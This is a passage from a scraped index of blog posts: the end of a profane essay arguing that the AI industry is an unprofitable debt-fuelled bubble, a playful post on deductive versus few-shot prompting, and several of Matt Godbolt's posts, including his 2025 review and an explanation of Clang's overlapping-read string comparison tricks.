hour according to Silicon Data , and that\u2019s before the majority of Blackwell-powered GPUs come online. Most AI Startups Don\u2019t Rent GPUs, And There Isn\u2019t A Market For AI Compute Yet the customer base shrinks from there, because the majority of AI startups aren\u2019t actually renting GPUs \u2014 they build products on top of models built by OpenAI or Anthropic, who have made it clear they\u2019re buying capacity from either hyperscalers or, in OpenAI\u2019s case, getting Oracle or CoreWeave to build it for them. Why? Because building your own model is incredibly capital-intensive, and it\u2019s hard to tell if the results will be worth it. Now, let\u2019s assume \u2014 I don\u2019t actually believe it will, but let\u2019s try anyway \u2014 that all of that 3.2GW of capacity comes online. How much compute does an AI company use? OpenAI claims it has 2GW of capacity as of the end of 2025 , and is allegedly approaching 900 million weekly active users . I don\u2019t think there are any AI companies with even 10% of that userbase, but even if there were, OpenAI spent $8.67 billion on inference through the end of September. Who can afford to pay even 10% of that a year? Or 5%? Yet in reality, OpenAI is likely more indicative of the overall compute spend of the entire AI industry. As I\u2019ve said, most companies are powered not by their own GPU-driven models, but by renting them from other providers. OpenAI and Anthropic spent a combined $11.33 billion in compute on Azure and AWS respectively through the first 9 months of this year, and as the two largest consumers of AI compute, which suggests two things: The market for AI compute is very, very small. If you assume that Anthropic spent the same on Google Cloud as it did on AWS ($2.66 billion, for a total of $5.32 billion), and add CoreWeave\u2019s revenue ($5 billion, most of which was either OpenAI (via Microsoft) or NVIDIA), there doesn\u2019t appear to be an AI compute market, outside of serving these two companies. The market for AI compute is not actually growing. In the last two years, no new major consumers of AI compute have emerged. Every company that has signed a large compute deal has either been OpenAI, Anthropic or a hyperscaler. Even if Cursor were to dump its entire $2.3 billion in funding into AI compute, that would still not be enough. In fact, it would take sinking every single dollar of venture capital \u2014 over $200 billion \u2014 every single year and then some funneled into AI compute just to provide the revenue to justify these deals. In the space of a year, Microsoft Azure made $75 billion , Google Cloud $43 billion and Amazon Web Services $100 billion . Need more proof? Still don\u2019t believe me? Then skip to page 18 of NVIDIA\u2019s most-recent earnings : Multi-year cloud service agreement commitments as of October 26, 2025, were $26 billion for which $1 billion, $6 billion, $6 billion, $5 billion, $4 billion, and $4 billion will be paid in fiscal years 2026 (fourth quarter), 2027, 2028, 2029, 2030, and 2031 &amp; thereafter, respectively. If there\u2019s such incredible, surging demand, why exactly is NVIDIA spending six fucking billion dollars a year in 2026 and 2027 on cloud compute ? NVIDIA doesn\u2019t need the compute \u2014 it just shut down its AWS rival DGX Cloud ! It looks far more like NVIDIA is propping up an industry with non-existent demand. I\u2019m afraid there is no secret AWS-sized spend waiting in the wings for the right moment to pounce. There is no secret demand wave, nor is there any capacity crunch that is holding back incredible swaths of revenue. Oracle\u2019s $523 billion in remaining performance obligations are made up of OpenAI, Meta, and fucking NVIDIA . For AI data centers to make sense, most startups would have to start becoming direct users of AI compute , while also spending more on cloud compute services than they\u2019ve ever spent. The largest consumers of AI compute are both unprofitable, unsustainable monstrosities. The Tide Comes In \u2014 And The Truth Comes Out About AI Margins Eventually, reality will dawn on one or more of these banks. Projects will get delayed thanks to weather, or budgetary issues, or when customers walk away ( as just happened to data center REIT Fermi ). Loan payments will start going unpaid. Elsewhere, AI startups will keep asking for money, again and again, and for a while they\u2019ll keep raising, until the valuations get too high, or VC coffers get too low. You\u2019re probably gonna say at this point that Anthropic or OpenAI might go public, which will infuse capital into the system, and I want to give you a preview of what to look forward to, courtesy of AI labs MiniMax and Zhipu (as reported by The Information), which just filed to go public in Hong Kong. Anyway, I\u2019m sure these numbers are great- oh my GOD ! In the first half of this year, Zhipu had a net loss of $334 million on $27 million in revenue , and guess what, 85% of that revenue came from enterprise customers. Meanwhile, MiniMax made $53.4 million in revenue in the first nine months of the year, and burned $211 million to earn it. It is time to wake up. These are the real-life costs of running an AI company. OpenAI and Anthropic are going to be even worse. This is why nobody wants to take AI companies public. This is why nobody wants to talk about the actual costs of AI. This is why nobody wants you to know the hourly cost of running a GPU, and this is why OpenAI and Anthropic both burn billions of dollars \u2014 the margins fucking stink , every product is unprofitable , and none of these companies can afford their bills based on their actual cashflow. Generative AI is not a functional industry, and once the money works that out, everything burns. Though many AI data centers boast of having tenancy agreements, remember that these agreements are either with AI startups that will run out of money or hyperscalers with legal teams numbering in the thousands. Every single deal that Microsoft, Amazon, Meta, Google or NVIDIA signs is riddled with outs specifically hedging against this scenario, and there won\u2019t be a damn thing that anybody can do if hyperscalers decide to walk away. The AI Bubble Is A Debt and Venture Bubble, And Will Burst When Both Run Out Before then, NVIDIA\u2019s bubble is likely to burst. As I discussed a few weeks ago, NVIDIA claims to have shipped six million Blackwell GPUs , and while it may be employing very dodgy maths (claiming each Blackwell GPU is actually two GPUs because each one has two chips ), my modeling of its last three quarters suggests that NVIDIA shipped around 5.33GW\u2019s worth of GPUs \u2014 and based on reading about every single data center I can find, it doesn\u2019t appear that many have been built and powered on. Worse still, NVIDIA\u2019s diversified revenue is collapsing. In Q1FY26, two customers represented 16% and 14% of revenue, in Q2FY26 two customers represented 23% and 16% of revenue, and in Q3FY26 four customers represented 22%, 15%, 13% and 11% of total revenue, with all that money going toward either GPUs or networking gear. I go into detail here , but I put it in a chart to show you why this is bad: In simpler terms, NVIDIA\u2019s revenue is no longer coming from a diverse swath of customers. In Q1FY26, NVIDIA had $30.84 billion of diversified revenue, Q2 $28.51 billion, and Q3 $22.23 billion. NVIDIA GPUs are astronomically expensive \u2014 $4.5 million for a GB300 rack of 72 B300 GPUs, for example \u2014 and filling data centers full of them requires debt unless you\u2019re a hyperscaler. While I can\u2019t say for sure, I believe NVIDIA\u2019s diversified revenue collapse is a sign that smaller data center projects are starting to have issues getting funded, and/or hyperscalers are pulling back on their GPU purchases. To look through the eyes of an AI booster \u2014 all I\u2019m seeing is blue and yellow, as usual! \u2014 one might say that these big customers are covering the loss of revenue, but the reality is that these big projects are run on debt issued by banks that are becoming increasingly-worried about nobody paying them back. The mistake that every investor, commentator, analyst and member of the media makes about NVIDIA is believing that its sales are an expression of demand for AI compute, when it\u2019s really more of a statement about the availability of debt from banks and private credit. Similarly, the continued existence of AI startups is an expression of the desperation of venture capital, and the continuing flow of massive funding rounds is a sign that they see no other avenues for growth. Eventually, data centers are going to go unbuilt, and data center debt packages will begin to fall apart. Remember, Oracle\u2019s $38 billion data center deal is actually yet to close , much like Stargate New Mexico is yet to close. These deals, while seeming like they\u2019re trending positively, are both incredibly important to the future of the AI bubble, and any failure will spook an already-nervous market. Only one link in the chain needs to break. Every part of the AI bubble \u2014 this fucking charade \u2014 is unprofitable, save for NVIDIA and the construction firms erecting future laser tag arenas full of negative-margin GPUs. What happens if the debt stops flowing to data centers? How will NVIDIA sell those 20 million Blackwell and Vera Rubin GPUs ? What happens if venture capitalists start running low on funds, and can\u2019t keep feeding hundreds of millions of dollars to AI startups so that they can feed them to Anthropic or OpenAI? What happens to OpenAI and Anthropic if their already negative-margin businesses when their customers run out of money? What happens to Oracle or CoreWeave\u2019s work-in-progress data centers if OpenAI can\u2019t pay its bills? What happens to Anthropic\u2019s $21 billion of Broadcom orders, or tens of billions of Google Cloud spend? What If I\u2019m Right? In the last year, I estimate I\u2019ve been asked the question \u201cwhat if you\u2019re wrong?\u201d over 25 times. Every single time the question comes with an undercurrent of venom \u2014 the suggestion that I\u2019m being an asshole for daring to question the wondrous AI bubble. Every single person who has asked this has been poorly-read \u2014 both in terms of my work and the surrounding economics and technological possibilities of Large Language Models \u2014 and believes they\u2019re defending technology, when in reality they\u2019re defending growth , and the Rot Economy\u2019s growth-at-all-costs mindset. In many cases they are not excited about technology , but the prospects of being first in line to lick an already-sparkling boot. This has never been about progress or productivity. If it was, we\u2019d actually see progress, or productivity boosts, or anything other than the frothiest debt and venture markets of all time. Large Language Models do not create novel concepts, they are inconsistent and unreliable, and even the \u201cgood\u201d things they do vary wildly thanks to the dramatic variance of a giant probability machine. LLMs are not good enough for people to pay regular software prices at any scale, and the consequences of this will be that every single dollar spent on GPUs has been for exactly one point: manipulating the value of their stocks. AI does not have the business returns and may have negative gross margins. It is inconsistent, ugly, unreliable, expensive and environmentally ruinous, pissing off a large chunk of consumers and underwhelming most of the rest, other than those convinced they\u2019re smart for using it or those who have resigned to giving up at the sight of a confidence game sold by a tech industry that stopped making products primarily focused on solving the problems of consumers or businesses some time ago. You may say that I\u2019m wrong because Google, Microsoft, Meta and Amazon continue to have healthy net revenues and revenue growth, and as I previously said, these companies are not sharing AI revenues and their existing businesses are still growing due to the massive monopolies they\u2019ve built. And I want to plea to AI boosters and bullish analysts alike: you are being had. Satya Nadella, Sam Altman, Dario Amodei, Jensen Huang, Mark Zuckerberg, Larry Ellison, Safra Catz, Elon Musk, Clay Magouyrk, Mark Sicilia, Michael Truell, Aravind Srivinas \u2014 all of them are laughing at you behind your back, because they know that you are never going to ask the obvious questions that would defeat my arguments, and know that you will never, ever push back on them. The enshittification of the shareholder has the downstream effect of an enshittification of the media and Wall Street analysts writ large. These companies own you. They treat you with disdain and condescension, because they know you\u2019ll let them. They know that no sell-side analyst will ever ask them \u201cwhen will you be profitable?\u201d or \u201chow much are you spending?\u201d or if you do ask, they know you will experience temporary amnesia and forget whatever answer they give, because these are the incentives of an enshittified stock market, where stocks are not extrapolations of shareholder value but chips in a fucking casino where the house always wins and changes the rules every three months. They have changed the meaning of \u201cstock\u201d to mean \u201cwhat the market will reward,\u201d and when you allow companies to start dictating the terms of what will be rewarded \u2014 as neoliberalism, Friedman, Reagan, Nixon, NAFTA, Thatcher, and every other policy has, orienting everything exclusively around growth \u2014 companies eventually cut off any powers that may curtail any reevaluation of the fundamental terms of capitalism, and the incentives within. Focusing on growth-at-all-costs thinking naturally encourages, enables, and empowers grifters, because all they ever have to promise is \u201cmore\u201d \u2014 more users, more debt, more venture, more features, more everything . The very institutions that are meant to hold companies accountable \u2014 analysts and the media \u2014 are far more desperate to trade scoops for interviews, to pull punches, to find ways to explain why a company is right rather than understand what the company is doing, and this is something pushed not by writers, but by editors that want to make sure they stay on the right side of the largest companies. And if I\u2019m right, OpenAI\u2019s death will kill off most if not all other AI startups, Anthropic included. Every investor that invested in AI will take massive losses. Every startup that builds on the back of their models will see their company fold, if it hasn\u2019t already due to the massive costs and upcoming price increases. The majority of GPU-based data centers \u2014 which really have no other revenue stream \u2014 will be left inert, likely powered down, waiting for the day that somebody works it all out, which they won\u2019t, because literally everybody has these things now and I truly believe they\u2019ve tried everything. I don\u2019t \u201chate on AI\u201d because I am a hater, I hate on it because it fucking sucks and what I\u2019m worried about happening seems to be happening. The tech industry has run out of hypergrowth ideas, and in its desperation hitched itself to the least-profitable hardware and software in history, then spent three straight years lying about what was possible to the media, analysts and shareholders. And they were allowed to lie , because everybody lapped it the fuck up. They didn\u2019t need to worry about convincing anybody. Financiers, editors, analysts and investors were already drafting reasons why they were excited about something they didn\u2019t really understand or believe in, other than the fact it promised more. This is what happens when you make everything about growth: everybody becomes stupid, ready to be conned, ready to hear what the next big growth thing is because asking nasty questions gets you fucking fired. And what\u2019s left is a tech industry that doesn\u2019t build technology, but growth-focused startups. Look at Silicon Valley. Do you see these fucking people ever building a new kind of computer? Do you believe these men fit to even imagine a future? These men care about the status quo, they want to always have more software to sell or ways to increase advertising revenue so that the stock number goes up so they receive more money in the form of stock compensation. They are concerned with neither actual business value, honest exchange of value, or societal value. Their existence is only in shareholder value, which is how they are incentivized by their board of directors. And really, if you\u2019re still defending AI -- does it matter to any of you that this software fucking sucks, does it? If you think it\u2019s good you don\u2019t know much about software! It does not respond precisely at any point to a user or programmer\u2019s intent. That\u2019s bad software. I don\u2019t care that you have heard developers really like it, because that doesn\u2019t fix the underlying economic and social poison in AI. I don\u2019t care that it sort of replaced search for you. I don\u2019t care if you \u201cknow a team of engineers that use it.\u201d Every single AI app is subsidized, its price is fake, you are being lied to, and none of this is real. When the collapse happens, do not let a single person that waved off the economics have a moment\u2019s peace. Do not let anybody who sat in front of Dario Amodei or Sam Altman and squealed with delight at whatever vacuous talking points they burped out forget that they didn\u2019t push them, they didn\u2019t ask hard questions, they didn\u2019t worry or wonder or feel any concern for investors or the general public. Do not let a single analyst that called AI skeptics \u201cluddites\u201d or equated them to flat Earthers hear the end of it. Do not let anybody who claimed that we \u201clost control of AI\u201d or \u201c blackmailed developers \u201d go without their complementary \u201cFell For It Again\u201d badge. When it happens, I promise I won\u2019t be too insufferable, but I will be calling for accountability for anybody who boosted AI 2027 , who sat in front of Sam Altman or Dario Amodei and refused to ask real questions, and for anyone who collected anything resembling \u201cdetailed notes\u201d about me or any other AI skeptic. If you think I\u2019m talking about you, I probably am, and I have a question: why didn\u2019t you approach the AI companies with as much skepticism as you did the skeptics? I also promise you, if I\u2019m wrong , I\u2019ll happily explain how and why, and I\u2019ll do so at length, too. I will have links and citations, I\u2019ll do podcast episodes. I will make a good faith effort to explain every single failing, because my concern is the truth, and I would love everybody else to follow suit. Do you think any booster will have the same courtesy? Do you think they care about the truth? Or do they just want to get a fish biscuit from Sam Altman or Jensen Huang? Pathetic. What Does The Future Look Like? It\u2019s times like this where it\u2019s necessary to make the point that there is absolutely \u201cenough money\u201d to end hunger or build enough affordable housing or have universal healthcare, but they would be \u201ctoo expensive\u201d or \u201cnot profitable enough,\u201d despite having a blatant and obvious economic benefit in that more people would have happier, better lives and \u2014 if you must see the world in purely reptilian senses \u2014 enable many more people to have disposable income and the means of entering the economy on even terms. By contrast, investments in AI do not appear to be driving much economic growth at all, other than in the revenue driven to NVIDIA from selling these GPUs, and the construction of data centers themselves. Had Microsoft, Google, Meta and Amazon sunk $776 billion into building housing and renting it out, the world would be uneven, we would have horrible new landlords, and it would still be a great deal better than one where nearly a trillion dollars is being wasted propping up a broken, doomed industry, all because the people in charge are fucking idiots obsessed with growth. The future, I believe, spells chaos, and I am trying to rise to the occasion. My work has transformed from being critical of the tech industry to a larger critique of the global financial system. I\u2019ve had to learn accountancy, the mechanics of venture and private equity, and all sorts of annoying debt-related language, all so that I sufficiently explain what\u2019s going on. I see several worrying signs I have yet to fully understand. The Discount Window \u2014 where banks go when they need quick liquidity as a last resort \u2014 has seen a steady increase of loans on its books since September 2024 , suggesting that financial institutions are facing liquidity issues, and the last few times that this has happened, financial crises followed. There is also a brewing bullshit crisis in Private Equity, which is heavily invested in data centers. In September, Auto parts maker First Brands collapsed in a puff of fraud with billions of dollars \u201c vanishing \u201d after it double-pledged the same collateral to multiple loans, off-balance sheet liabilities, falsified invoices, and even leased some of the parts it sold. This wasn\u2019t a case where smaller lenders were swindled, either \u2014 global investment banks UBS and Jefferies both lost hundreds of millions of dollars , along with asset manager BlackRock through associated funds. Subprime auto lender Tricolor collapsed in similar circumstances , burning JPMorgan , Jefferies, and Zions Bancorporation, who also loaned money to First Brands. A similar situation is currently brewing with Solar company PosiGen, which recently filed for bankruptcy after, you guessed it, double-pledging collateral for loans. One of its equity financing backers is Magnetar Capital , who invested in CoreWeave. What appears to be happening is simple: large financial institutions are issuing debt without doing the necessary due diligence or considering the future financial health of the companies involved. Private Equity firms are also heavily-leveraged, sidling acquisitions with debt, and playing silly games where they \u201cvolatility launder\u201d \u2014 deliberately choosing not to regularly revalue assets held to make returns (or the value of assets) look better to their investors . I don\u2019t really know what this means right now, but I am worried that these data center loans have been entered into under similarly-questionable circumstances. Every single data center deal is based on the phony logic that AI will somehow become profitable one day, and if there\u2019s even one First Brands situation, the entire thing collapses. Thank You For Reading I realize this is the longest thing I\u2019ve ever written ( or should I say written so far? ), and I want to end it on a positive note, because hundreds of thousands of people now read and listen to my work, and it\u2019s important to note how much support I\u2019ve received and how awesome it is seeing people pick up my work and run with. I want to be clear that there is very little that separates you from the people running these companies, or many analysts. I have taught myself everything I know from scratch, and I believe you can too, and I hope I have been able to and will be able to teach you everything I know, which is why everything I write is so long. Well, that and I\u2019m working out what I\u2019m going to say as I write it. The AI bubble is an inflation of capital and egos, of people emboldened and outright horny over the prospect of millions of people\u2019s livelihoods being automated away. It is a global event where we\u2019ve realized how the global elite are just as stupid and ignorant as anybody you\u2019d meet on the street \u2014 Business Idiots that couldn\u2019t think their way out of a paper bag, empowered by other Business Idiots that desperately need to believe that everything will grow forever. I have had a tremendous amount of help in the last year \u2014 from my editor Matt Hughes , Robert and Sophie at Cool Zone Media, Better Offline producer Matt Osowski, Kakashii and JustDario (two pseudonymous analysts that know more about LLMs and finance than most people I read), Kasey Kagawa , Ed Ongweso Jr ., Rob Smith , Bryce Elder and Tabby Kinder of the Financial Times, all of whom have been generous with their time, energy and support. A special shoutout to Caleb Wilson ( Kill The Computer ) and Arif Hasan ( Wide Left ), my cohosts on our NFL podcast 60 Minute Drill . And I\u2019ve heard from thousands of you about how frustrated you are, and how none of this makes sense, and how crazy you feel seeing AI get shoved into every product, how insane it marks you feel when somebody tells you that LLMs are amazing when their actual outputs fucking suck. We are all being lied to, we all feel gaslit and manipulated and punished for not pledging ourselves to Sam Altman\u2019s graveyard smash, but I believe we are right . In the last year, my work has gone from being relatively popular to being cited by multiple major international news organizations, hedge funds, and internal investor analyses. I was profiled by the Financial Times , went on the BBC twice , and watched as my Subreddit, r/ BetterOffline , grew to around 80,000 visitors a week and became one of the 20th largest podcast Subreddits, which is a bigger deal than it sounds. I believe there are millions of people that are tired of the state of the tech industry, and disgusted at what these people have done to the computer. I believe that they outnumber the boosters, the analysts and the hype-fiends that have propped up this era. I believe that a better world is possible by creating a meaningful consensus around making the powerful prove themselves to us rather than proving it for them. I am honoured that you read me, and even more so if you read this far. I\u2019ll see you in 2026. '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:57:18</p>"},{"location":"worksonmymachine.substack.com/","title":"worksonmymachine.substack.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>The Different Shapes of -Think Before You Build- Prompting 20260128</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"worksonmymachine.substack.com/The%20Different%20Shapes%20of%20-Think%20Before%20You%20Build-%20Prompting_20260128/","title":"The Different Shapes of \"Think Before You Build\" Prompting","text":"<p>\u6765\u6e90: worksonmymachine.substack.com \u53d1\u5e03\u65f6\u95f4: Wed, 28 Jan 2026 14:42:45 GMT \u94fe\u63a5: https://worksonmymachine.ai/p/the-different-shapes-of-think-before</p> <p>There's a beaver who lives upstream from here. You probably haven't met him. He's quite particular about guests.</p> <p>This beaver builds dams. That's what beavers do. But this beaver kept building dams that... well\u2026</p> <p>One collapsed in spring. One leaked from seventeen places at once. One was structurally perfect but faced the wrong direction and created a pond in someone else's forest, which caused a whole thing with the elk, and\u2026 honestly\u2026 it's probably best not to get into it.</p> <p>The beaver was frustrated. He knew how to build dams. He'd read all the dam literature. But knowing and doing kept arriving at different addresses.</p> <p>Then he found the Oracle.</p> <p>Deep in the forest there's an old stump with a hollow inside, and in the hollow lives something that knows things. The beaver doesn't know what it is. Neither do I. It speaks in a voice like wind through telephone wires, if telephone wires grew in forests, which they don't, but\u2026 whatever\u2026 just roll with it\u2026</p> <p>The beaver asked the Oracle: \"Build me a dam.\"</p> <p>The Oracle hummed. Considered. Built something.</p> <p>It was made of fish.</p> <p>\"That's not a dam,\" said the beaver.</p> <p>\"You didn't say no fish,\" said the Oracle.</p> <p>The beaver tried again. But this time, before asking for a dam, he asked:</p> <p>\"What makes a dam good?\"</p> <p>The Oracle thought about this for a long time. Or maybe no time at all. Time is weird in stumps.</p> <p>Then he asked for the dam.</p> <p>This is Deductive Prompting, which is a fancy way of saying: make the Oracle say what good is, out loud, before you make it do good.</p> <p>The Oracle knows things. But it forgets to check if it's using what it knows. When you make it speak the principles first, they're right there, in its head, fresh. It builds against them. It measures twice.</p> <p>The beaver understood this intuitively. Beavers always measure twice. It's a whole thing with us.</p> <p>But sometimes the beaver is in a hurry.</p> <p>He doesn't have time to ask the Oracle to philosophize about dams. He's seen good dams. He knows what they look like. He just needs another one, quick, before the rain comes.</p> <p>So he shows the Oracle three dams. Doesn't explain anything. Doesn't ask why they work. Just points.</p> <p>Inductive Prompting. Examples \u2192 (implicit pattern) \u2192 new instance.</p> <p>This is classic few-shot prompting, but viewed through a \"think before you build\" lens.</p> <p>The pattern stays inside the Oracle's head. You never see it. You never audit it. You just... trust. Trust that the Oracle looked at your three dams and understood what you meant by \"like these.\"</p> <p>This is the fastest technique. Also the one that requires the most faith.</p> <p>The beaver uses it when he's in a hurry, when the stakes are low, when the pattern is easier to show than to explain. When he just needs a dam and doesn't need to understand why it's a good dam.</p> <p>The risk? The Oracle might induce a different pattern than the one you intended. You're looking at your examples thinking \"ah yes, the load distribution\" and the Oracle is looking at them thinking \"ah yes, they all face north.\"</p> <p>And then you get a north-facing dam in a south-facing watershed, and the elk are back, and... well...</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:44:48</p>"},{"location":"xania.org/","title":"xania.org","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>2025 in Review</li> <li>Clever memory tricks</li> <li>Switching it up a bit</li> <li>Thank you</li> <li>When compilers surprise you</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"xania.org/2025%20in%20Review/","title":"2025 in Review","text":"<p>\u6765\u6e90: xania.org \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: http://xania.org/202512/2025-in-review?utm_source=feed&amp;utm_medium=rss</p> <p>{'type': 'application/xhtml+xml', 'language': 'en-GB', 'base': 'https://xania.org/feed', 'value': '<p>Written by me, proof-read by an LLM.\\nDetails at end.</p>\\n\\n\\n<p>2025 has been quite a year for me. The big ticket things for me were having the majority of the year on a non-compete, a new job, and some videos and conference talks.</p>\\n\\n<p>It was a bumper year for my public talks, which included:</p>\\n\\n<ul>\\n<li>ACCU Keynote - Teaching an Old Dog New Tricks</li>\\n<li>C++ on Sea - a reprise of the above talk, slightly shortened</li>\\n<li>CppCon Keynote - C++: Some Assembly Required</li>\\n<li>Jane Street - Microarchitecture: What Happens Beneath</li>\\n</ul>\\n\\n<p>I also appeared in a number of Computerphile videos:</p>\\n\\n<ul>\\n<li>Computer Timescales Mapped onto Human Timescales</li>\\n<li>How CPU Memory &amp; Caches Work</li>\\n<li>Subroutines in Low Level Code</li>\\n<li>CPU Interrupts</li>\\n<li>CPU Kernel Mode</li>\\n<li>Memory Mapping</li>\\n<li>CPU Summary</li>\\n<li>What is Bootstrapping Anyway?</li>\\n<li>How Computers Store Data Serially</li>\\n<li>How Ethernet Sends Data</li>\\n</ul>\\n\\n<p>On the Compiler Explorer front, I finally solved a three-year-old problem with CEFS \u2014 our new content-addressable filesystem that mounts compiler images on demand instead of all 2,000+ at boot time. I also launched the experimental Claude Explain feature during my CppCon keynote, and wrote about how CE works and our cost transparency. As always, CE is a community effort and I\\'m grateful to all the contributors who keep it running.</p>\\n\\n<p>Ben and I kept up our monthly Two\\'s Complement podcast, releasing all 12 episodes on schedule. Highlights included pondering AI pair programming, debating C++ and Rust, worrying about vibe coding replacing junior developers, and bonding over Factorio.</p>\\n\\n<p>I ticked off a bucket list item by appearing in a Tom7 video, alongside such greats as Matt Parker and jan Misali in a bonkers Secret Santa video. Such fun, and thank you Santa for my very awesome comic book.</p>\\n\\n<p>Finally I had my very own series on YouTube - the Advent of Code Optimisation - 27 videos in all. That was a huge amount of work: with the blog posts, filming and editing I estimate I spent around 10 hours on each 5-10m video!</p>\\n\\n<p>A very busy year, ending with me starting work at Hudson River Trading. I\\'m only a month in, but I couldn\\'t be happier with my decision to work here: it\\'s a fantastic place full of impressive technology, interesting problems, and perhaps most importantly, kind and thoughtful human beings.</p>\\n\\n<p>Here\\'s to whatever excitement 2026 will bring! Happy New Year everyone!</p>\\n\\n<p>This post was written by a human (Matt Godbolt) and reviewed and proof-read by an LLM.</p>'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:01</p>"},{"location":"xania.org/Clever%20memory%20tricks/","title":"Clever memory tricks","text":"<p>\u6765\u6e90: xania.org \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: http://xania.org/202512/22-memory-cunningness?utm_source=feed&amp;utm_medium=rss</p> <p>{'type': 'application/xhtml+xml', 'language': 'en-GB', 'base': 'https://xania.org/feed', 'value': '<p>Written by me, proof-read by an LLM.\\nDetails at end.</p>\\n\\n<p>After exploring SIMD vectorisation over the last couple of days, let\\'s shift gears to look at another class of compiler cleverness: memory access patterns. String comparisons seem straightforward enough - check the length, compare the bytes, done. But watch what Clang does when comparing against compile-time constants, and you\\'ll see some rather clever tricks involving overlapping memory reads and bitwise operations. What looks like it should be a call to <code>memcmp</code> becomes a handful of inline instructions that exploit the fact that the comparison value is known at compile time<sup>1</sup>.</p>\\n\\n<p>I\\'ve set up nine functions that each compare a <code>std::string_view</code> against a constant string of increasing length, from one to nine characters. This gives us a chance to see how the compiler\\'s approach changes based on the length of the comparison.</p>\\n\\n<p>As we learned when looking at calling conventions, a <code>std::string_view</code> is a pointer and a length, passed in two registers on x86 Linux. Each of these functions receives a <code>std::size_t</code> length in <code>rdi</code> and a <code>const char *</code> pointer in <code>rsi</code><sup>2</sup>. One might reasonably expect a call to <code>memcmp</code>, but the compiler has both inlined and specialised the comparison for each constant string. Let\\'s take a look at some of these comparison functions, starting with <code>t1</code>:</p>\\n\\n<pre><code>t1:\\n  cmp rdi, 1                ; is length 1?\\n  jne .LBB0_1               ; if not 1, goto \"return false\"\\n  cmp byte ptr [rsi], 65    ; is the byte 65 (\\'A\\')?\\n  sete al                   ; set result to 0 or 1 accordingly\\n  ret                       ; return\\n.LBB0_1:\\n  xor eax, eax              ; set result to false\\n  ret                       ; return\\n</code></pre>\\n\\n\\n<p>We see the length is checked first, and if it\\'s not 1, then we return. Otherwise, we check the one character to see if it\\'s <code>A</code> or not, and then set the return value accordingly. The compiler has used a conditional set <code>sete</code> instruction to avoid a second branch.</p>\\n\\n<p>The pattern holds for power-of-two sizes: Looking at <code>t2</code>, <code>t4</code> and <code>t8</code> we see that the compiler does the same length check, and then cleverly realises it can compare a 2, 4 or 8-byte value directly with a constant of either <code>AB</code>, <code>ABCD</code> or <code>ABCDEFGH</code> (mouse over the constants in the view to see Compiler Explorer interpret them as ASCII).</p>\\n\\n<p>Things get more interesting with the 7 character case, <code>t7</code>:</p>\\n\\n<pre><code>t7:\\n  cmp rdi, 7                    ; is length 7?\\n  jne .LBB6_1                   ; if not, goto \"return false\"\\n  mov eax, 1145258561           ; set eax to \"ABCD\"\\n  xor eax, dword ptr [rsi]      ; eax ^= first four chars of sv\\n  mov ecx, 1195787588           ; set ecx to \"DEFG\"\\n  xor ecx, dword ptr [rsi + 3]  ; ecx ^= chars 3,4,5,6 of sv\\n  or ecx, eax                   ; ecx |= eax\\n  sete al                       ; result = 1 if \"zero flag\" else 0\\n  ret                           ; return\\n</code></pre>\\n\\n\\n<p>The check for the length is the same as the other cases, but once we know we\\'re going to be comparing 7 bytes, some cunning tricks come into play. First, the compiler isn\\'t directly comparing, as you might expect: It uses the fact that XORing identical values will result in a zero. Secondly, it has used two overlapping reads - reading bytes 0,1,2,3 and then 3,4,5,6. The redundant read of byte 3 doesn\\'t matter, but doing two 32-bit reads is cheaper than having to read individual bytes.</p>\\n\\n<p>Once the two XORs have happened, we have \"zero only if first four bytes match ABCD\" in <code>eax</code> and \"zero only if bytes 3,4,5,6 match DEFG\" in <code>ecx</code>. Simply logical-ORing the two together gives us zero if and only if both were zero - only if all bytes matched. Then a simple <code>sete</code> turns the \"zero flag\" into either 0 or 1 for the <code>true</code>/<code>false</code> return value needed. Cute!</p>\\n\\n<p>This optimisation works well on x86 as reading unaligned 32-bit values is free. You can play around with the compiler choice and see what neat tricks are conjured up by different compilers and architecture choices.</p>\\n\\n<p>And that\\'s what makes modern compilers remarkable - all this cleverness is conjured up from a simple <code>sv == \"ABCDEFG\"sv</code>. The overlapping reads, the XOR operations, the branchless conditionals - they\\'re all applied automatically. Your job is to write clear code; the compiler\\'s job is to make it fast. Leave it to do its thing, and try not to get in its way!</p>\\n\\n<p>See the video that accompanies this post.</p>\\n\\n\\n\\n<p>This post is day 22 of Advent of Compiler Optimisations 2025,\\na 25-day series exploring how compilers transform our code.</p>\\n\\n<p>\u2190 When SIMD Fails: Floating Point Associativity | Switching it up a bit \u2192</p>\\n\\n<p>This post was written by a human (Matt Godbolt) and reviewed and proof-read by LLMs and humans.</p>\\n\\n<p>Support Compiler Explorer on Patreon\\nor GitHub,\\nor by buying CE products in the Compiler Explorer Shop.</p>\\n\\n\\n\\n<ol>\\n<li>\\n<p>GCC generates more obvious, but slightly worse code, with some unnecessary logic operations. I filed a bug to investigate.\\xa0\u21a9</p>\\n</li>\\n<li>\\n<p>libstdc++\\'s <code>std::string_view</code> is defined as length then pointer, which is why we see length in <code>rdi</code> before pointer in <code>rsi</code>.\\xa0\u21a9</p>\\n</li>\\n</ol>\\n'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:01</p>"},{"location":"xania.org/Switching%20it%20up%20a%20bit/","title":"Switching it up a bit","text":"<p>\u6765\u6e90: xania.org \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: http://xania.org/202512/23-switching-it-up?utm_source=feed&amp;utm_medium=rss</p> <p>{'type': 'application/xhtml+xml', 'language': 'en-GB', 'base': 'https://xania.org/feed', 'value': '<p>Written by me, proof-read by an LLM.\\nDetails at end.</p>\\n\\n<p>The standard wisdom is that switch statements compile to jump tables. And they do - when the compiler can\\'t find something cleverer to do instead.</p>\\n\\n<p>Let\\'s start with a really simple example:</p>\\n\\n<p>Here the compiler has spotted the relationship between 